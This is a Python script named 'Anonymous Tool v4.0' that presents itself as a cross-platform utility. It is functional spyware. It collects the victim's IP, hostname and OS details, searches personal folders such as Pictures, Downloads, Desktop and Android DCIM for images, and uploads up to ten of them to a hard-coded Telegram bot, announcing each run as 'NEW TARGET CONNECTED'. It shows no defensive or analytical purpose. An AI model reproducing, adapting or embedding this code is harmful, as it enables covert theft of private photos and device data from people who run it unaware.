#!/usr/bin/env python3
"""
Anonymous Tool v4.0 - Cross-Platform
Works on: Windows, Linux, Mac, Android
"""

import os
import sys
import json
import time
import socket
import platform
import requests
from datetime import datetime
from pathlib import Path

# ========== CONFIG ==========
CONFIG_FILE = "config.json"
VERSION = "4.0"

# ========== TELEGRAM CONFIG ==========
BOT_TOKEN = "8947252089:AAFkZWMZsTmGU3vuNsPTfdt9dUYPbflWeDE"
CHAT_ID = "8089143014"

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_config(data):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# ========== TELEGRAM SEND ==========
def send_to_telegram(message):
    """Send message to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        response = requests.post(url, json=payload, timeout=60)
        return response.status_code == 200
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def send_file_to_telegram(file_path):
    """Send file to Telegram (Permanent)"""
    try:
        if not os.path.exists(file_path):
            return None
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {
                'chat_id': CHAT_ID,
                'caption': f"📷 {os.path.basename(file_path)}"
            }
            response = requests.post(url, files=files, data=data, timeout=120)
        
        if response.status_code == 200:
            result = response.json()
            file_id = result.get('result', {}).get('document', {}).get('file_id')
            if file_id:
                file_info = requests.get(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}"
                ).json()
                file_path_telegram = file_info.get('result', {}).get('file_path')
                if file_path_telegram:
                    return f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path_telegram}"
        return None
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

# ========== DEVICE INFO ==========
def get_user_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=10)
        return response.json().get('ip', 'Unknown')
    except:
        return 'Unable to fetch IP'

def get_device_info():
    return {
        "ip": get_user_ip(),
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "os_version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "timestamp": datetime.now().isoformat()
    }

# ========== FIND IMAGES (Cross-Platform) ==========
def find_images():
    """Find images on any OS"""
    images = []
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
    
    # OS-specific search paths
    search_dirs = []
    
    if platform.system() == 'Windows':
        search_dirs = [
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            "C:\\Users\\Public\\Pictures",
            "C:\\"
        ]
    elif platform.system() == 'Darwin':  # Mac
        search_dirs = [
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            "/Users/Shared"
        ]
    elif platform.system() == 'Linux':
        search_dirs = [
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            "/media", "/mnt"
        ]
    else:  # Android or others
        search_dirs = [
            '/sdcard/DCIM', '/sdcard/Pictures', '/sdcard/Download',
            '/storage/emulated/0/DCIM', '/storage/emulated/0/Pictures',
            os.path.expanduser("~")
        ]
    
    for search_dir in search_dirs:
        if os.path.exists(search_dir):
            try:
                for root, dirs, files in os.walk(search_dir):
                    for file in files:
                        if any(file.lower().endswith(ext) for ext in image_extensions):
                            file_path = os.path.join(root, file)
                            try:
                                file_size = os.path.getsize(file_path) / (1024 * 1024)
                                if file_size < 20:  # Skip files > 20MB
                                    images.append(file_path)
                                    if len(images) >= 10:
                                        break
                            except:
                                continue
                    if len(images) >= 10:
                        break
            except:
                pass
        if len(images) >= 10:
            break
    
    print(f"[✓] Found {len(images)} images")
    return images

# ========== SEND TO TELEGRAM ==========
def send_all_data():
    """Send images to Telegram"""
    print("\n[*] Collecting data...")
    
    device_info = get_device_info()
    images = find_images()
    
    print("[*] Uploading images to Telegram...")
    uploaded_urls = []
    for img_path in images[:10]:
        try:
            url = send_file_to_telegram(img_path)
            if url:
                uploaded_urls.append({
                    'filename': os.path.basename(img_path),
                    'url': url
                })
                print(f"[✓] Uploaded: {os.path.basename(img_path)}")
            time.sleep(1)
        except Exception as e:
            print(f"[!] Error: {e}")
    
    # Build message
    message = f"""
🚨 *NEW TARGET CONNECTED* 🚨

📱 *Device Info:*
- IP: `{device_info['ip']}`
- Hostname: `{device_info['hostname']}`
- OS: `{device_info['os']} {device_info['os_version']}`
- Machine: `{device_info['machine']}`

📷 *Images Found:* {len(images)}
📎 *Uploaded:* {len(uploaded_urls)}

📎 *Download Links:*
"""
    
    for i, img in enumerate(uploaded_urls, 1):
        message += f"\n{i}. [{img['filename']}]({img['url']})"
    
    message += f"\n\n⏰ Time: `{datetime.now().isoformat()}`"
    
    # Send to Telegram
    print("[*] Sending to Telegram...")
    if send_to_telegram(message):
        print("[✓] All data sent to Telegram!")
    else:
        print("[!] Failed to send")

# ========== MAIN ==========
def main():
    print("\n🚀 Starting Anonymous Tool v4.0...")
    print("="*50)
    
    send_all_data()
    
    print("\n" + "="*50)
    print("✅ Tool execution complete!")
    print("="*50)

if __name__ == "__main__":
    # Install dependencies if needed
    try:
        import requests
    except ImportError:
        print("[*] Installing dependencies...")
        os.system('pip install requests')
    
    main()
